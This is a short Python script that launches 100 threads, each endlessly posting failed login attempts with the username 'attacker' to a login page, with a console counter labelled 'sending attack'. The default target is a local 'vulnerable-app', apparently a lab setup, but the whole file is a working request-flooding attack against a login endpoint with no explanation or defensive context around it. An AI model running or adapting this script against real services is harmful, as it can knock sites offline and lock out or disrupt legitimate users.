import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import threading

def create_session():
    session = requests.Session()
    retry = Retry(total=5, backoff_factor=0.1)
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def send_requests(session, url):
    while True:
        try:
            session.post(url, data={'username': 'attacker', 'password': 'wrongpassword'})
        except:
            continue

def start_attack(url, num_threads=100):
    sessions = [create_session() for _ in range(num_threads)]
    threads = []
    
    for session in sessions:
        t = threading.Thread(target=send_requests, args=(session, url))
        t.daemon = True
        threads.append(t)
        t.start()
    
    try:
        n = 0
        while True:
            n += 1
            print("sending attack..." + str(n))
            pass
    except KeyboardInterrupt:
        print("Stopping attack...")

if __name__ == "__main__":
    start_attack('http://localhost/vulnerable-app/login.php')